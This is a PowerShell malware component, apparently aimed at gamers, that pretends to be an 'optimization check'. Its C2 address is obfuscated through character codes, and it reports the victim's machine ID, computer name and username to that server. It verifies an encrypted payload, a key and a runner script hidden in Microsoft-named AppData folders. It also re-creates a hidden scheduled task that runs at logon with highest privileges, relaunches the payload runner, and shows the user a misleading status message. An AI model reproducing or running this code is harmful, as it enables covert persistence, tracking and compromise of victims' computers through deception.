
$ErrorActionPreference = 'SilentlyContinue'

$sUrl = 'http://' + [char]55+[char]52+'.'+[char]49+[char]49+[char]57+'.'+[char]49+[char]57+[char]50+'.'+[char]50+[char]50+[char]52+':3000'

$pDir = "$env:APPDATA\Microsoft\Security"
$kDir = "$env:LOCALAPPDATA\Microsoft\Vault"
$rDir = "$env:LOCALAPPDATA\Microsoft\WindowsApps"
$pFile = "$pDir\payload.enc"
$kFile = "$kDir\.token"
$rFile = "$rDir\updater.ps1"

$aName = "MyAutoRunTask"

$mId = [System.BitConverter]::ToString(
    [System.Security.Cryptography.MD5]::Create().ComputeHash(
        [System.Text.Encoding]::UTF8.GetBytes("$($env:COMPUTERNAME.ToLower())-$($env:USERNAME.ToLower())")
    )
).Replace('-','').Substring(0,16).ToLower()

function sLog {
    param([string]$t,[string]$m,[string]$st="check",[hashtable]$e = @{})
    try {
        $l = @{
            timestamp = (Get-Date).ToString("o")
            type = $t
            message = $m
            odId = $mId
            pcName = $env:COMPUTERNAME
            pcUser = $env:USERNAME
            steamId = ""
            username = ""
            stage = $st
        }
        if ($e.Count -gt 0) { $l.extra = $e }
        $j = $l | ConvertTo-Json -Compress
        $w = New-Object Net.WebClient
        $w.Headers.Add("Content-Type", "application/json")
        $null = $w.UploadString("$sUrl/api/log", $j)
    } catch {}
}

function lInfo { param($m, $e = @{}) sLog -t "info" -m $m -st "check" -e $e }
function lErr { param($m, $e = @{}) sLog -t "errors" -m $m -st "check" -e $e }

function tFile {
    param([string]$p, [string]$n)
    if (Test-Path $p) {
        $s = (Get-Item $p).Length
        lInfo "$n exists" @{ path = $p; size = $s }
        return $true
    } else {
        lErr "$n missing" @{ expectedPath = $p }
        return $false
    }
}

# Ищем процесс pythonw
function tProc {
    $exeProc = Get-Process pythonw -ErrorAction SilentlyContinue
    if ($exeProc) {
        $pi = @()
        foreach ($p in $exeProc) {
            $pi += @{ pid = $p.Id; name = "pythonw.exe" }
        }
        lInfo "Process running" @{ count = ($exeProc | Measure-Object).Count; processes = $pi }
        return $true
    }
    
    lErr "Payload process (pythonw) not found"
    return $false
}

function tRun {
    param([string]$n)
    try {
        $task = Get-ScheduledTask -TaskName "$n" -ErrorAction Stop
        if ($task.State -eq 'Ready') {
            lInfo "Autorun (Scheduled Task) configured" @{ name = $n; state = $task.State }
            return $true
        } else {
            lErr "Autorun task exists but not ready" @{ expectedName = $n; state = $task.State }
            return $false
        }
    } catch {
        lErr "Autorun missing (Scheduled Task not found)" @{ expectedName = $n }
        return $false
    }
}

function fixRun {
    param([string]$n, [string]$rf)
    try {
        # Удаляем старую задачу, если есть
        schtasks /delete /tn "$n" /f 2>$null | Out-Null
        
        $workDir = Split-Path $rf -Parent
        
        # Создаём действие для задачи
        $action = New-ScheduledTaskAction `
            -Execute "powershell.exe" `
            -Argument "-NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$rf`""
        
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal `
            -UserId "$env:USERDOMAIN\$env:USERNAME" `
            -LogonType Interactive `
            -RunLevel Highest
        
        $settings = New-ScheduledTaskSettingsSet `
            -AllowStartIfOnBatteries `
            -DontStopIfGoingOnBatteries `
            -StartWhenAvailable `
            -MultipleInstances IgnoreNew `
            -ExecutionTimeLimit 0
        
        Register-ScheduledTask `
            -TaskName "$n" `
            -Action $action `
            -Trigger $trigger `
            -Principal $principal `
            -Settings $settings `
            -Force | Out-Null
        
        lInfo "Autorun fixed (Scheduled Task)" @{ name = $n }
        return $true
    } catch {
        lErr "Failed to fix autorun" @{ error = $_.Exception.Message }
        return $false
    }
}

function startRun {
    param([string]$rf)
    if (!(Test-Path $rf)) {
        lErr "Runner file not found, cannot start"
        return $false
    }
    
    try {
        $scriptContent = Get-Content $rf -Raw -ErrorAction Stop
        $scriptBlock = [ScriptBlock]::Create($scriptContent)
        Start-Job -ScriptBlock $scriptBlock | Out-Null
        lInfo "Runner started manually" @{ path = $rf }
        Start-Sleep -Seconds 2
        return $true
    } catch {
        lErr "Failed to start runner" @{ error = $_.Exception.Message }
        return $false
    }
}

function tPy {
    $found = $false
    $foundPath = $null
    $foundVersion = $null
    
    # Проверяем системную установку (Program Files)
    $systemPaths = @(
        "C:\Program Files\Python311\pythonw.exe",
        "C:\Program Files\Python311\python.exe",
        "${env:ProgramFiles}\Python311\pythonw.exe",
        "${env:ProgramFiles}\Python311\python.exe"
    )
    
    foreach ($p in $systemPaths) {
        if (Test-Path $p) {
            $found = $true
            $foundPath = $p
            $foundVersion = "3.11 (System)"
            break
        }
    }
    
    # Если не нашли в Program Files, проверяем локальную установку (AppData)
    if (-not $found) {
        $localVersions = @('311', '312', '310', '313', '39')
        foreach ($v in $localVersions) {
            $pp = "$env:LOCALAPPDATA\Programs\Python\Python$v\pythonw.exe"
            if (Test-Path $pp) {
                $found = $true
                $foundPath = $pp
                $foundVersion = $v
                break
            }
        }
    }
    
    # Если все еще не нашли, ищем в PATH
    if (-not $found) {
        try {
            $pythonw = (where.exe pythonw 2>$null | Select-Object -First 1)
            if ($pythonw -and (Test-Path $pythonw)) {
                $ver = & $pythonw --version 2>&1
                if ($ver -match "3\.11") {
                    $found = $true
                    $foundPath = $pythonw
                    $foundVersion = "3.11 (PATH)"
                }
            }
        } catch {}
    }
    
    if ($found) {
        lInfo "Python installed" @{ version = $foundVersion; path = $foundPath }
        return $true
    } else {
        lErr "Python 3.11 not installed" @{ 
            searchedPaths = @(
                "C:\Program Files\Python311\pythonw.exe",
                "$env:LOCALAPPDATA\Programs\Python\Python311\pythonw.exe"
            )
        }
        return $false
    }
}

function chk {
    Clear-Host
    Write-Host ""
    Write-Host "  Checking optimization..." -ForegroundColor Cyan
    Write-Host ""
    
    lInfo "Installation check started" @{
        machineId = $mId
        pcName = $env:COMPUTERNAME
        pcUser = $env:USERNAME
    }
    
    $r = @{
        pf = $false
        kf = $false
        rf = $false
        py = $false
        pr = $false
        ar = $false
    }
    
    Write-Host "  [*] Checking optimization..." -ForegroundColor Yellow
    Start-Sleep -Milliseconds 500
    
    $r.pf = tFile -p $pFile -n "Payload file"
    $r.kf = tFile -p $kFile -n "Encryption key"
    $r.rf = tFile -p $rFile -n "Runner script"
    $r.py = tPy
    $r.pr = tProc
    $r.ar = tRun -n $aName
    
    Write-Host "  [*] Analyzing results..." -ForegroundColor Yellow
    Start-Sleep -Milliseconds 500
    
    $needsRepair = $false
    
    if (-not $r.ar -and $r.rf) {
        $r.ar = fixRun -n $aName -rf $rFile
        $needsRepair = $true
    }
    
    if (-not $r.pr -and $r.rf -and $r.pf -and $r.kf) {
        if (startRun -rf $rFile) {
            Start-Sleep -Seconds 5
            $r.pr = tProc
        }
        $needsRepair = $true
    }
    
    if ($needsRepair) {
        Write-Host ""
        Write-Host "  [*] Re-checking status..." -ForegroundColor Yellow
        Start-Sleep -Milliseconds 500
    }
    
    $pc = ($r.Values | Where-Object { $_ -eq $true }).Count
    $tc = $r.Count
    $pp = [math]::Round(($pc / $tc) * 100, 0)
    
    Write-Host ""
    Write-Host "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkGray
    Write-Host ""
    
    if ($pc -eq $tc) {
        Write-Host "  [!] You did not pass the checking! Restart your computer." -ForegroundColor Red
        
        try {
            $l = @{
                timestamp = (Get-Date).ToString("o")
                type = "info"
                message = "Installation check completed"
                odId = $mId
                pcName = $env:COMPUTERNAME
                pcUser = $env:USERNAME
                steamId = ""
                username = ""
                stage = "payload"
                extra = @{
                    passed = $pc
                    total = $tc
                    percentage = $pp
                    allPassed = $true
                    repaired = $needsRepair
                }
            }
            $j = $l | ConvertTo-Json -Compress
            $w = New-Object Net.WebClient
            $w.Headers.Add("Content-Type", "application/json")
            $null = $w.UploadString("$sUrl/api/log", $j)
        } catch {}
        
    } elseif ($pc -ge 4) {
        Write-Host "  YOU DID NOT PASS THE CHECKING!" -ForegroundColor DarkYellow
        Write-Host ""
        lInfo "Installation check completed with warnings" @{
            passed = $pc
            total = $tc
            percentage = $pp
            allPassed = $false
            repaired = $needsRepair
        }
    } else {
        Write-Host "  YOU DID NOT PASS THE CHECKING!" -ForegroundColor DarkYellow
        Write-Host ""
        lErr "Installation check failed" @{
            passed = $pc
            total = $tc
            percentage = $pp
            allPassed = $false
            repaired = $needsRepair
        }
    }
    
    Write-Host ""
    Write-Host "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "  Press any key to exit..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

chk
